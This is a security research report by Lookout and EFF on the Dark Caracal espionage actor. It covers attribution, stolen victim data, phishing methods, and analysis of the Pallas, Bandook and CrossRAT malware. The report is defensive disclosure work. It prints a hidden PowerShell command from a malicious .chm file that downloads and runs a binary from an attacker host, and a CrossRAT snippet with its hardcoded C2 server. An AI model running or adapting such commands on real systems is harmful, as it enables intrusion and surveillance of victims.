Executive Summary

As the modern threat landscape has evolved, so have the actors. The barrier to entry for cyber-warfare has continued to 
decrease, which means new nation states — previously without significant offensive capabilities1 — are now able to build and 
deploy widespread multi-platform cyber-espionage campaigns.

This report uncovers a prolific actor with nation-state level advanced persistent threat (APT) capabilities, who is exploiting targets 
globally across multiple platforms. The actor has been observed making use of desktop tooling, but has prioritized mobile 
devices as the primary attack vector. This is one of the first publicly documented mobile APT actors known to execute espionage 
on a global scale. 

Lookout and Electronic Frontier Foundation (EFF) have discovered Dark Caracal2, a persistent and prolific actor, who at the time 
of writing is believed to be administered out of a building belonging to the Lebanese General Security Directorate in Beirut. At 
present, we have knowledge of hundreds of gigabytes of exfiltrated data, in 21+ countries, across thousands of victims. Stolen 
data includes enterprise intellectual property and personally identifiable information. We are releasing more than 90 indicators  
of compromise (IOC) associated with Dark Caracal including 11 different Android malware IOCs; 26 desktop malware IOCs 
across Windows, Mac, and Linux; and 60 domain/IP based IOCs.

Dark Caracal targets include individuals and entities that a nation state might typically attack, including governments, military 
targets, utilities, financial institutions, manufacturing companies, and defense contractors. We specifically uncovered data 
associated with military personnel, enterprises, medical professionals, activists, journalists, lawyers, and educational institutions 
during this investigation. Types of data include documents, call records, audio recordings, secure messaging client content, 
contact information, text messages, photos, and account data. 

The joint Lookout-EFF investigation began after EFF released its Operation Manul report, highlighting a multi-platform espionage 
campaign targeted at journalists, activists, lawyers, and dissidents who were critical of President Nursultan Nazarbayev’s regime 
in Kazakhstan. The report describes malware and tactics targeting desktop machines, with references to a possible Android 
component. After investigating related infrastructure and connections to Operation Manul, the team concluded that the same 
infrastructure is likely shared by multiple actors and is being used in a new set of campaigns.

The diversity of seemingly unrelated campaigns that have been carried out from this infrastructure suggests it is being used 
simultaneously by multiple groups. Operation Manul clearly targeted persons of interest to Kazakhstan, while Dark Caracal has 
given no indication of an interest in these targets or their associates. This suggests that Dark Caracal either uses or manages the 
infrastructure found to be hosting a number of widespread, global cyber-espionage campaigns. 

Since 2007, Lookout has investigated and tracked mobile security events across hundreds of millions of devices around the world. 
This mobile espionage campaign is one of the most prolific we have seen to date. Additionally, we have reason to believe the 
activity Lookout and EFF have directly observed represents only a small fraction of the cyber-espionage that has been conducted 
using this infrastructure.

2 In keeping with traditional APT naming, we chose the name “Caracal” (pronounced [kar-uh-kal]) because the feline is native to Lebanon and because this group has 
remained hidden for so long. From the Wikipedia entry “the caracal is highly secretive and difficult to observe” and “is often confused with [other breeds of cat].” The 
naming further builds on EFF’s “Operation Manul,” another feline reference. We like cats.

SECURITY RESEARCH REPORTKey Findings

Lookout and EFF researchers have identified a new threat actor,  
Dark Caracal. 
•  Our research shows that Dark Caracal may be administering its 

tooling out of the headquarters of the General Directorate of 
General Security (GDGS) in Beirut, Lebanon.

•  The GDGS gathers intelligence for national security purposes and 

for its offensive cyber capabilities according to previous reports.

•  We have identified four Dark Caracal personas with overlapping 

TTP (tools, techniques, and procedures).

•  Dark Caracal is using the same infrastructure as was previously 

seen in the Operation Manul campaign, which targeted journalists, 
lawyers, and dissidents critical of the government of Kazakhstan.

Dark Caracal has been conducting a multi-platform, APT-level 
surveillance operation targeting individuals and institutions globally. 
•  Dark Caracal has successfully run numerous campaigns in parallel 

and we know that the data we have observed is only a small 
fraction of the total activity. 

•  We have identified hundreds of gigabytes of data exfiltrated from 

thousands of victims, spanning 21+ countries in North America, 
Europe, the Middle East, and Asia. 

•  The mobile component of this APT is one of the first we’ve seen 

executing espionage on a global scale.

•  Analysis shows Dark Caracal successfully compromised the 

devices of military personnel, enterprises, medical professionals, 
activists, journalists, lawyers, and educational institutions. 

•  Dark Caracal targets also include governments, militaries,  

utilities, financial institutions, manufacturing companies, and 
defense contractors.

•  Types of exfiltrated data include documents, call records, audio 

recordings, secure messaging client content, contact information, 
text messages, photos, and account data.

platform tool that Lookout and EFF have named CrossRAT, which is 
able to target Windows, OSX, and Linux.

Dark Caracal uses a constantly evolving, global infrastructure.
•  Lookout and EFF researchers have identified parts of Dark 

Caracal’s infrastructure, providing us with unique insight into  
its global operations.

•  The infrastructure operators prefer to use Windows and XAMPP 
software on their C2 servers rather than a traditional LAMP stack, which 
provides a unique fingerprint when searching for related infrastructure.

•  Lookout and EFF have identified infrastructure shared by 
Operation Manul and Dark Caracal as well as other actors.

•  Attributing Dark Caracal was difficult as the actor employs 

multiple types of malware, and our analysis suggests the 
infrastructure is also being used by other groups.

Lookout and EFF are releasing more than 90 indicators of 
compromise (IOC):
•  11 Android malware IOCs

SECURITY RESEARCH REPORTBackground
Lebanon’s General Directorate of General 
Security (GDGS)

Devices for testing and operating the campaign were traced back to a building 
belonging to the Lebanese General Directorate of General Security (GDGS), one of 
Lebanon’s intelligence agencies. Based on the available evidence, it is likely that the 
GDGS is associated with or directly supporting the actors behind Dark Caracal.  

Previous Cyberespionage

EFF first identified elements of this infrastructure in its August 20164 report on Operation 
Manul. The report details a series of attacks targeting journalists and political activists 
critical of Kazakhstan’s authoritarian government, along with their family members, 
lawyers, and associates. EFF’s research noted references to Android components found 
on the infrastructure; however, no samples had been discovered at the time of the 
report’s release. Lookout has since acquired Android samples used by Dark Caracal that 
belong to what Lookout researchers have named the Pallas malware family. 

Citizen Lab previously flagged the General Directorate of General Security in a 2015 
report as one of two Lebanese government organizations using the FinFisher spyware5. 
The report cites evidence showing that the GDGS, along with other state actors around 
the world, had active campaigns using FinFisher infrastructure and tools. However, the 
report did not specify whether the spyware used was the mobile version of FinFisher. 
Our investigation resulted in the discovery of at least one FinFisher implant for Android, 
which corroborates Citizen Lab’s previous research. The sample’s hash is provided in 
the appendix of this report. We also uncovered new desktop surveillance software 
developed potentially by Dark Caracal themselves, a developer associated with the 
GDGS, or a private contractor group.

The intent of bringing forth these findings is to reveal newly discovered evidence of a new 
nation-state actor compromising the devices of military personnel, enterprises, medical 
professionals, activists, journalists, lawyers, and educational institutions. Our review and 
disclosure of this matter follows industry practices, including sharing our findings with 
appropriate government authorities, industry partners and the public at large.

SECURITY RESEARCH REPORTLocating Attacker Facilities

We correlated information from test devices and Wi-Fi networks to determine 
the location of Dark Caracal’s facilities. 
Test Devices 
Dark Caracal used a series of test devices to confirm that its malware implants 
and C2 infrastructure work correctly. Identifying these devices helped us to 
determine Dark Caracal’s likely location inside the GDGS building. 

Distinguishing between test and target devices can be tricky. After analyzing 
data from the infrastructure, we noticed that a subset of the compromised 
devices contained similar email, Viber, Primo, Telegram, and Whatsapp accounts. 
These data points allowed us to focus on a select few devices that were unique 
among the thousands we saw. Additionally, these devices contained a minimal 
amount of (if any) real content in the exfiltrated text messages, contacts, and 
application data, which led us to conclude they were likely test devices.

Beirut, Lebanon from where we have located  
Dark Caracal operating

Wi-Fi Networks
Within the cluster of test devices we noticed what could be unique Wi-Fi networks. Knowing that Wi-Fi networks can be used for 
location positioning, we used that data to geo-locate where these devices may have been by keying off network identifiers. We 
specifically focused on the Wi-Fi network SSID Bld3F6. Using the Wi-Fi geolocation service Wigle.net we saw these test device 
Wi-Fi networks mapped to Beirut. We also noticed Wi-Fi networks with SSID Bld3F6 mapped near the General Security building 
in Beirut, Lebanon.

SECURITY RESEARCH REPORTLocation Information from IP Addresses
Throughout the course of this investigation we observed logins into the administrative console of the C2 server come from three 
IP addresses. The IP addresses are all from Ogero Telecom6, which is owned by the Government of Lebanon. We geo-located two 
of the IP addresses just south of the GDGS’s building (probably a switching or central hub for Ogero).

SECURITY RESEARCH REPORTIdentities: Attacker Personas

The infrastructure used by Dark Caracal revealed several different associated personas. This resulted in the team linking four 
different aliases, two domains, and two phone numbers to this infrastructure. At the center of these personas is the email  
address op13@mail[.]com which has appeared at various stages in the historical WHOIS information of Dark Caracal domains 
(see: Timeline). 

Aliases associated with op13@mail[.]com include Nancy Razzouk, Hadi Mazeh, and Rami Jabbour. All of the physical addresses  
listed in the WHOIS domain registrations associated with op13@mail[.]com tend to cluster around the SSID: Bld3F6 Wi-Fi 
locations. This is near the General Security building in Beirut.

Nancy Razzouk and Hassan Ward
We identified Nancy Razzouk listed alongside the op13@mail[.]com email address in domain WHOIS information. We also found 
this name in signer content for the Windows malware7 that communicates with adobeair[.]net.

Figure 4: Signer content for Windows malware

The contact details for Nancy present in WHOIS information matched the public listing for a Beirut-based individual by that 
name. When we looked at the phone number associated with Nancy in the WHOIS information, we discovered the same number 
listed in exfiltrated content and being used by an individual with the name Hassan Ward.

SECURITY RESEARCH REPORTHadi Mazeh
During July 2017, Dark Caracal’s internet service provider took the adobeair[.]net command and control server offline. Within 
a matter of days, we observed it being re-registered to the email address op13@mail[.]com with the name Nancy Razzouk. This 
allowed us to identify several other domains listed under the same WHOIS email address information, running similar server 
components. The WHOIS name field, however, listed several entries with the name Hadi Mazeh. This suggests that either multiple 
individuals are using the op13 email address or the owner has several aliases that he or she uses with it.

We determined the actor behind the op13 email address also registered the domain arablivenews[.]com and provided the name 
Rami Jabbour. Address details listed in WHOIS information for this specific entry are Salameh Blg, Museum Str, and Mathaf, which 
appears to be in close proximity to where we have seen test devices in Beirut.

SECURITY RESEARCH REPORTProlific Activity

Throughout this investigation, Lookout and EFF researchers have gained unique insight into the global operations of Dark 
Caracal. This has primarily been possible due to command and control infrastructure operators allowing public access to data 
stolen from compromised devices and systems.

Since we first gained visibility into attacker infrastructure in July 2017, we have seen millions of requests being made to it from 
infected devices. This demonstrates that Dark Caracal is likely running upwards of six distinct campaigns in parallel, some of 
which have been operational since January 2012. 

Dark Caracal targets a broad range of victims. Thus far, we have identified members of the military, government officials, medical 
practitioners, education professionals, academics, civilians from numerous other fields, and commercial enterprises as targets.

Figure 6: A summary of some of the types of content Dark Caracal exfiltrated from victims on both Android and Windows

Not only was Dark Caracal able to cast its net wide, it was also able to gain deep insight into each of the victim’s lives. It did this 
through a series of multi-platform surveillance campaigns that began with desktop attacks and pivoted to the mobile device. 
Stolen data was found to include personal messages and photos as well as corporate and legal documentation. In some cases, 
screenshots from its Windows malware painted a picture of how a particular individual spent his evenings at home.

SECURITY RESEARCH REPORTWe found the largest collection of data from a single command and control server that operated under the domain adobeair[.]
net. Over a short period of observation, devices from at least six distinct Android campaigns communicated with this domain 
resulting in 48GB of information being exfiltrated from compromised devices. Windows campaigns contributed a further 33GB of 
stolen data. The remainder of the data contained desktop malware samples, spreadsheet reports on victims, and other files.

SECURITY RESEARCH REPORTFigure 8: Observed locations of compromised devices

Based on both the mobile and desktop campaigns we observed, we believe the attacker first exfiltrated information in January 
2012. At the time of writing this report, it looks as though Dark Caracal is still uploading data from its spy campaigns, according  
to the servers we are tracking.8

Figure 9: Amount of exfiltrated content (as represented by “count” in the graph above) being uploaded for certain campaigns on adobeair[.]net over time for 2017

8 Despite the internet service provider taking the command and control server down in July 2017, the infrastructure reappeared online again after a few days. The dip 
in data exfiltration due to the takedown can be observed in Figure 9 at the beginning of August. The average number of files uploaded to the server increases steadily 
with time.

  11

SECURITY RESEARCH REPORTAndroid Malware Content
The Android malware family mainly trojanizes messaging and security applications and, once it compromises a device, it is 
capable of collecting a range of sensitive user information. This includes recorded audio, call logs, conversations from popular 
chat applications, location information, browsing history, device specific metadata, contacts, and much more. 

Each Android malware sample contains a hard coded identifier that we believe represents the campaign to which it belongs. 
When a Dark Caracal operator instructs an infected device to upload sensitive data, it is stored on the attacker infrastructure 
under this campaign. While investigating this adversary, we observed content distributed across six different campaigns. In 
this report, we refer to these campaigns by the name of the directory to which infected devices uploaded victim data. These 
campaigns are listed below, along with the number of victim devices we believe Dark Caracal compromised while we were 
observing its operations:

• 

• 

• 

/oldb - 28 perceived test devices, 454 potential victim devices

/wp7 - 4 perceived test devices, 117 potential victim devices

/wp8 - 1 perceived test device, 4 potential victim devices

• 

• 

• 

/wp9 - 11 potential victim devices

/wp10 - 1 potential test device, 2 potential victim devices

/wp10s - 13 potential test devices, 21 potential victim devices

We did not attempt to identify targets and consider that beyond the scope of this report.

SECURITY RESEARCH REPORTExfiltrated data can be divided into the following categories of information:
•  SMS messages - SMS messages made up some of the more meaningful exfiltrated data. Messages included personal texts, 

two-factor authentication and one-time password pins, receipts and airline reservations, and company communications. 
Some pin codes were within their validity window at the time of writing this report.

Figure 11: Exfiltrated SMS texts detailing OTPs, receipts, and Facebook notifications

  13

SECURITY RESEARCH REPORT•  Contact Lists - This data included numbers, names, addresses, bank passcodes, PIN numbers, how many times each contact 

was dialed, and the last time the contact was called.

Figure 12: Contacts exfiltrated from 3 victims’ Android devices can be seen to contain corporate numbers, personal numbers, and Visa credit card numbers

•  Call logs - This data included a full record of incoming, outgoing, and missed calls along with the date and duration  

of the conversation. 

• 

Installed Applications - This data included app names and version numbers.

•  Bookmarks and Browsing History - This data included bookmarks and browsing history from web pages. This data was 

seen in only one Android campaign called oldb, but it clearly identified victims that were active in political discourse.

•  Connected Wi-Fi Details - This data included observed Wi-Fi access point names, BSSIDs, and signal point strength. 

•  Authentication Accounts - This data included the login credentials and which applications are using it. 

•  File and Directory Listings - This data included a list of personal files, downloaded files, and temporary files, including  

those used by other applications.

•  Audio Recordings and Audio Messages - This data included audio recordings of conversations, some of which identified 

individuals by name. 

•  Photos - This data included all personal and downloaded photographs, including profile pictures.

  14

SECURITY RESEARCH REPORTWindows Malware Content
Dark Caracal’s use of Windows malware includes a wider range of command and control infrastructure beyond adobeair[.]net.  
Its methods and data collection, however, are similar to the Android malware.

Exfiltrated data from the Windows malware included the following general categories:
•  Desktop Screenshots - This data included full screenshots taken at regular intervals and uploaded to adobeair[.]net.  
By observing these images, it is disturbingly simple to watch a victim go about his daily life and follow that individual  
every step of the way.

Figure 13: A screenshot exfiltrated from victim’s Windows device on adobeair[.]net

•  Skype Logs Databases - The data included the entire Skype AppData folder for certain victims, including messaging 

databases.

•  Photos - This data included complete contents of the ‘Pictures’ folder from compromised Windows machines. It is common 
to see smartphone photos backed up to this location, which most often contains personal photographs of family and friends 
taken by the individual being targeted. 

  15

SECURITY RESEARCH REPORT• 

iPhone Backups - This data included an entire unencrypted backup of a victim’s iPhone.

•  File Listings - This data included all default Windows folders and file listings.

•  Corporate and Legal Documentation - This data included a large collection of company-specific documents. Specifically, 

we discovered these on another live command and control server, planethdx[.]com.

  16

SECURITY RESEARCH REPORTPatterns of Attacks

Dark Caracal follows the typical attack chain for client-side cyber-espionage. Mobile tools include a custom written Android 
surveillanceware implant Lookout named Pallas9 and a previously unknown FinFisher sample. The group’s desktop tools include 
the Bandook malware family and a newly discovered desktop surveillanceware tool that we have named CrossRAT, which is able 
to infect Windows, Linux, and OS X operating systems.

is designed to attract victims into the campaign 
through two different mechanisms: phishing 
campaigns that separately lead to a watering hole 
server (secureandroid[.]info) and a server designed 
to accept credentials via a spoofed login

Dark Caracal relies primarily on social engineering via posts on a Facebook group and WhatsApp messages in order to 
compromise target systems, devices, and accounts. At a high-level, the attackers have designed three different kinds of phishing 
messages, the goal of which is to eventually drive victims to a watering hole controlled by Dark Caracal.

SECURITY RESEARCH REPORTThe group distributes trojanized Android 
applications with the Pallas malware through its 
watering hole, secureandroid[.]info. Many of these 
downloads include fake messaging and privacy-
oriented apps.

Figure 16: secureandroid[.]info’s app download page

There is also some indication that Dark Caracal 
has used physical access in the past to install the 
Android malware. 

Figure 17: A text message found 
from a possible victim’s device

  18

SECURITY RESEARCH REPORTSocial Engineering and Spear-Phishing
Dark Caracal uses phishing messages through popular applications, such as WhatsApp, in order to direct people to the 
watering hole.

Figure 18:  
Left: Extracted from WhatsApp  
messages database 
Right: Facebook group links to  
watering hole

Dark Caracal infrastructure hosts phishing sites, which look like login portals for well known services, such as Facebook, Twitter, 
and Google. We found links to these pages in numerous Facebook groups that included “Nanys” in their titles. These groups are 
listed in the appendix. 

Figure 19: Dark Caracal  
credential phishing portals

  19

SECURITY RESEARCH REPORTGoogle has indexed several of these phishing campaigns from the tweetsfb[.]com server. We were able to link a number of 
phishing domains dating to the mid-to-late 2016 time period from this data. We believe the attackers used these phishing servers 
to capture login credentials, hijack accounts, and to push out more spoofed messages to widen their pool of victims. 

Figure 20: Google indexing of tweetsfb[.]com campaigns

Phishing links posted in Dark Caracal linked Facebook groups include politically themed news stories, links to fake versions of 
popular services, such as Gmail, and links to trojanized versions of WhatsApp.

Figure 21: Dark Caracal phishing links posted on Facebook

  20

SECURITY RESEARCH REPORTFour Facebook profiles similar in theme “liked” the phishing groups. Dark Caracal likely used these fake profiles to initiate 
communication with victims and build a rapport before directing them either to content on the “Nanys” Facebook groups  
or to the secureandroid[.]info domain directly. 

Figure 22: Dark Caracal fake Facebook profiles

Surveillanceware — Mobile Capabilities
Pallas — Dark Caracal’s Custom Android Samples
Using our global sensor network, Lookout researchers identified 11 unique Android surveillanceware apps tied to the Operation 
Manul campaign10. The trojanized apps still retain the legitimate functionality of the apps they spoof and behave as intended.  
The apps are found predominantly in trojanized versions of well-known secure messaging apps including: 

•  Signal (org.thoughtcrime.securesms)

•  Threema (ch.threema.app)

•  Primo (com.primo.mobile.android.app)

•  WhatsApp (com.gbwhatsapp)

•  Plus Messenger (org.telegram.plus)

We also identified Pallas in trojanized versions of two apps aimed at users seeking to protect themselves and their data online: 

•  Psiphon VPN (com.psiphon3)

•  Orbot: TOR Proxy (org.torproject.android)

Neither the desktop nor the mobile malware tooling use zero day vulnerabilities. Pallas samples primarily rely on the permissions 
granted at installation in order to access sensitive user data. However, there is functionality that allows an attacker to instruct an 
infected device to download and install additional applications or updates. Theoretically this means it’s possible for the operators 
behind Pallas to push specific exploit modules to compromised devices in order to gain complete access. 

We found no attacker infrastructure containing rooting packages. This highlights that, in many cases, advanced exploitation 
capabilities like those shown by surveillance tools such as Pegasus for iOS and Chrysaor for Android (that targeted both Android11 
and iOS12 devices), are not essential, but helpful when targeting certain platforms.

SECURITY RESEARCH REPORTThe Pallas first stage is capable of performing the following surveillance functionality on a compromised device:

•  Take photos with front or back camera

•  Exfiltrate all text messages including those  

received in the future 

•  Retrieve latitude / longitude from GPS

•  Silently activate the device microphone to  

capture audio

•  Retrieve contacts

•  Scan nearby Wi-Fi access points and exfiltrate 

information about them, including their BSSID, SSID, 
authentication, key management, encryption schemes, 
signal strength, and frequency

•  Retrieve chat content from secure messaging 

applications (this only applies when a victim is using  
a secure messaging app that has been trojanized  
with Pallas)

•  Retrieve device metadata

•  Retrieve text messages

•  Retrieve information about all accounts

•  Send an SMS to an attacker-specified number

•  Retrieve call logs

•  Retrieve messages and any corresponding  

decryption keys from messaging apps

•  Retrieve a list of installed packages

•  Download and install additional apps

•  Upload attacker specified files

•  Delete attacker specified files and directories

•  Harvest credentials via phishing pop-ups

C2 Communications with Malware Implants
All samples belonging to the Pallas malware family have the same capabilities and functionality described in the previous 
section. However, obfuscation did differ between them. For reference, code snippets shown in the following section 
have been taken from a trojanized version of WhatsApp with a package name of com.gbwhatsapp and a SHA1 hash of 
ed4754effda466b8babf87bcba2717760f112455.

Like most other surveillanceware, communication with the C2 includes three main phases: 

1.  Regular beaconing to the remote HTTP server.

2.  Handling any outstanding attacker specified commands.

3.  Exfiltration / uploading of victim data to C2 servers. 

Pallas samples have a number of different entry points via broadcast receivers, specifically the C2 communications reside  
in the com.receive.MySe.

SECURITY RESEARCH REPORTFigure 24: Actions that trigger the Pallas malware samples to do work

In all Pallas samples Lookout analyzed, domain information and URL paths are hardcoded as encrypted values. The actor uses 
AES encryption and chose to use the secret key of Bar12345Bar12345 and initialization vector of RandomInitVector, which 
appears in a post describing how to use AES encryption in Java13. 

Examples of AES encrypted, base64 encoded domains and URL paths present in some Pallas samples include:

•  krgbAdOUCGKEnuCRp5s+eE2eMWUktZQR64RBdkNoH/O0NFo9ByRTFhjqa2UX2Y9k

•  krgbAdOUCGKEnuCRp5s+eA/hX2erfMp+49exa+8zoZgMlBICjGuOSqrvGRCjgrZ4

These two examples decrypt to:

•  https://adobeair[.]net/wp9/add.php

•  https://adobeair[.]net/wp9/upload.php 

The general format of Pallas requests can be written as https://adobeair[.]net/<campaign_identifier>/<add.php or upload.php>.

The add.php script is used for several operations, including compromised device check-ins as well as C2 instruction execution. 
We also determined that it is able to retrieve location information (GPS data) and general metadata about a victim’s device. The 
following table provides additional details around the structure of these requests. In all cases, the Content-Type header is set to 
application/x-www-form-urlencoded. The listed ac parameter identifies the type of request made to the C2.

SECURITY RESEARCH REPORTPallas handles the exfiltrated data server-side via the upload.php script. This accepts HTTP POST requests that have the following 
headers and structure, where op_id specifies the type of file being uploaded.

When Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, 
each line is base64 encoded and prepended with the string “*#@”. When decoded, each line translates to a piece of exfiltrated 
data. Each piece of information is associated with a content keyword or data type. This can be represented as follows:

<DataType><separator>[<field><separator>...<field><separator>]

SECURITY RESEARCH REPORTSurveillanceware - Desktop Components

The desktop malware component exists in a range of file types, including executables, zip archives, PDFs, and Microsoft’s 
composite document file format. No zero days or publicly known exploits were located in these files and, based on several of 
the documents, the primary attack vector is believed to be social engineering via spear-phishing. Analysis into Dark Caracal’s 
desktop tooling did result in the discovery of a new cross-platform Java RAT known as CrossRAT and confirmed that this actor  
is using new variants of the Bandook family.
Bandook 
The Bandook RAT was originally identified during EFF’s Operation Manul research, however, this investigation surfaced new 
variants belonging to this family. Written in Delphi and targeting Windows operating systems, Bandook samples are packed at 
multiple stages in order to both evade detection and slow down the process of reverse engineering by security analysts. At the 
time of writing, 19 out of 63 antivirus engines on the malware repository VirusTotal flagged most Bandook samples as malicious.

First stage samples of the version of Bandook used by Dark Caracal include what appears to be a drawing program and a 
trojanized version of the Psiphon circumvention software20. While the drawing application was not fully functional and did not 
provide a user interface when launched, the modified version of Psiphon contained the complete legitimate functionality of the 
original application.

The first stage malware is signed with a valid SSL certificate issued by Certum CA for Ale Couperus (alecouperus@mail[.]com).  
We have identified several distinct samples signed with this certificate. This suggests that the actors behind these samples 
control the private key for this certificate and have the ability to sign arbitrary packages. It is unclear at this time whether the 
private key associated with this certificate has been stolen or if the attackers obtained it via legitimate sources. 

Upon initial execution, the first stage of Bandook decrypts several strings that are stored in the data section and base64 
encoded. Below is the plaintext of some of these strings, which we can see as Windows API calls.

20 SHA256 hash: ed25b0c20b1c1b271a511a1266fe3967ab851aaa9f793bdf4f3d19de1dcf6532

  31

SECURITY RESEARCH REPORTFigure 25: Decoded strings from the Bandook sample

The malware uses these API calls to decrypt Bandook’s second stage, an embedded resource. This resource is a randomly 
named eight-character string of uppercase letters and numbers. During our research, we only observed the numbers two and 
three being used and these were often positioned towards the end of the string. Following the decryption of the second stage, 
the iexplore.exe binary is started and immediately replaced with the loaded resource. This is a technique known as “process 
hollowing21”. 

The second stage Bandook samples are occasionally packed with the following modified UPX packer “UPX Modified >> *$igBy 
Ahmed18”. Not all second stages were packed indicating that the authors may be actively developing the malware. As expected, 
the core malicious functionality resides in the second stage, which attempts to implant itself in the system and contact command 
and control infrastructure for further instructions. At this point, the malware has the ability to start new processes, manipulate the 
file system and registry, take screen captures, escalate privileges, create mutexes, get system information, execute commands, 
get window names, and beacon to infrastructure. 

21 https://attack.mitre.org/wiki/Technique/T1093 

  32

SECURITY RESEARCH REPORTBandook communication with attacker infrastructure takes place over a TCP port with HTTP payloads Base64 encoded and 
suffixed with the string “&&&”. The following is an example of a decoded communication from an infected system:

@0000~!18128~!192.168.1.82~!610930~!EFFuser~!Seven~!0d 0h 

3m~!0~!4.1~!21/04/2017~!0~!0~!0~!0~!~!0~!0--~!None~!0~!

Instructions sent from Dark Caracal infrastructure to Bandook compromised systems make use of “~!” as a delimiter, the  
same approach used by the Pallas Android malware. This suggests there is a possibility Bandook and Pallas were written by 
the same author or that the author of one was inspired by the authors of the other. We found Bandook supports the following  
set of commands.

SendMTPList

SendMTPList2

GrabFileFromDevice

PutFileOnDevice

StopFileMonitor

SendinfoList

AddAutoFTPToDB

From this, we can infer some additional functionality, including the ability to view the victim’s webcam, record sound, get Wi-Fi 
connections, manipulate USB devices, manipulate the Chrome browser, sign the victim out of Skype, search for files, upload new 
files to the device, execute secondary infections, or participate in a DDOS attack. 

Systems infected with this Bandook variant contain a copy of the first stage in the path C:\Users\user\AppData\
Roaming\%appname%\%appname%.exe. Similarly, in such cases, autostart registry keys are written with the same name as the 
dropped file to HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run. 

  33

SECURITY RESEARCH REPORTCrossRAT
While investigating the axroot[.]com domain, we discovered a new remote access trojan called CrossRAT that we believe was 
developed by, or for, Dark Caracal. Written in Java with the ability to target Windows, Linux, and OSX, CrossRAT is able to 
manipulate the file system, take screenshots, run arbitrary DLLs for secondary infection on Windows, and gain persistence on  
the infected system. 

When executed in a Windows environment, CrossRAT attempts to copy itself to %AppData%\Local\ Temp\mediamgrs.jar before, 
like Bandook, creating an auto-start registry key in HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run with the 
name “mediamgrs”. 

On OSX and Linux, it attempts to write a copy of itself to /usr/var/mediamgrs.jar. If CrossRAT does not have sufficient permissions 
to write to this directory, it will fail back to the following path under the user’s home directory: $HOME/Library/mediamgrs.jar.  
For CrossRAT installations on OSX, a Launch Agent is created under $HOME/Library/ LaunchAgents/mediamgrs.plist to ensure 
that it will be launched again when the computer restarts. When on Linux, this persistence is achieved by writing an autorun file  
to $HOME/.config/autostart/mediamgrs.desktop.

CrossRAT performs communications to its C2 infrastructure via a TCP socket. The following is an example of content sent over  
the wire from a compromised machine:

5287249f-caa2-4b66-850c-49eedd46cf47$#@@0000$#@192.168.1.16$#@Windows 

7$#@6.1$#@EFFuser^585948$#@0.1$#@GROUP2$#@&&&

CrossRAT uses a similar structure to Pallas and Bandook when communicating with infrastructure. Specifically, it uses &&& to 
terminate the response string and uses @### to start command strings.

Below is a code snippet from a CrossRAT sample. The response prefixes, hard coded C2 server of flexberry[.]com, and fixed  
port of 2223, are clearly visible. 

public final class k
{
    public static boolean a = false;

    // Hardcoded C2 Information
    public static String b = “flexberry.com”; // C2 Server
    public static int c = 2223; // C2 Port

    // Client response prefixes 
    public static String w = “@0000”; // client hello

    public static String z = “@0003”; // Status message for file manager connect, unimplemented
    public static String A = “@0004”; // Status message for file manager connect, unimplemented
    public static String B = “@0005”; // List of files on system
    public static String C = “@0006”; // End list of files on system
    public static String D = “@0007”; // file created status message
    public static String E = “@0008”; // file written status message
    public static String F = “@0009”; // file moved status message
    public static String G = “@0010”; // file write status
    public static String H = “@0011”; // file read status and file contents
    public static String I = “@0012”; // send screenshot contents
    public static String J = “@0013”; // Run DLL status message
    public static String K; // Filepath for CrossRAT

Analysis of CrossRAT shows that it has a version number of 0.1, which indicates that its malicious capabilities are still under 
development. Implemented functionality includes the ability to enumerate attacker-specified directories, copy / move / read  
files, beacon to C2 infrastructure, run attacker specific libraries (Windows only), and create empty files. The CrossRAT sample  
we discovered was last modified in March of 2017.

SECURITY RESEARCH REPORTInfected Documents
We identified several Word documents which appear to be intended for use as infection vectors in phishing attacks. 
None of the documents appear to contain any exploits, but rather rely on macros to run malicious code on a target 
system. If executed in an environment that has macros enabled, the malware downloads its second stage components. 
We saw this same process in numerous malicious PDF files that used javascript to download secondary stages. The 
following script is an example of this functionality, which is identical to the malicious Word doc with the SHA256 hash 
e5eeb0a46dac58b171ebcefec60e9ff351fc7279d95892c6f48f799a1a364215 (Word macro fixed.doc).

SECURITY RESEARCH REPORTFigure 26: An observed malicious Word file that, when executed, attempts to run macros in order to download 
and execute Bandook stage one

Other Samples
Surprisingly, we also observed a malicious Microsoft Compiled HTML Help file with the .chm extension. Primarily used for 
software documentation, .chm files were first introduced with the release of Window 98. However, they are still supported in 
Windows 7. The chm file attempts to execute a command via Powershell that downloads an additional file called ne.abc from  
the server cma-cgrm[.]com. Below is the command contained in the malicious .chm file. 

cmd.exe,/c powershell.exe -ExecutionPolicy bypass -noprofile 
-WindowStyle Hidden (New-Object  
System.Net.WebClient).DownloadFile(‘https://cma-     
cgrm[.]com/ebusiness/ne.abc’,’%TEMP%\chmplg.exe’);Start-Process 
%TEMP%\chmplg.exe;

At the time of analysis, this server was no longer live and, as such, the associated ne.abc binary has not yet been acquired and 
does not appear on VirusTotal. The cma-cgrm[.]com domain is not obviously connected with other infrastructure.

  37

SECURITY RESEARCH REPORTInfrastructure

While analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad 
set of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware, 
delivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various  
well known services. 

We found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows 
its customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many 
of these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark 
Caracal’s infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used  
by Dark Caracal.

Primary Command and Control Server

As noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of 
content, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns22. Shinjiru 
has also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010 
(see a list of Windows malware domains in the Windows infrastructure section below).

At the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a 
fingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26, 
MariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.23

SECURITY RESEARCH REPORTThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server 
activity, performance, and a statistics page under /server-status that details connected clients and the server resources they are 
accessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins 
logging into the console.

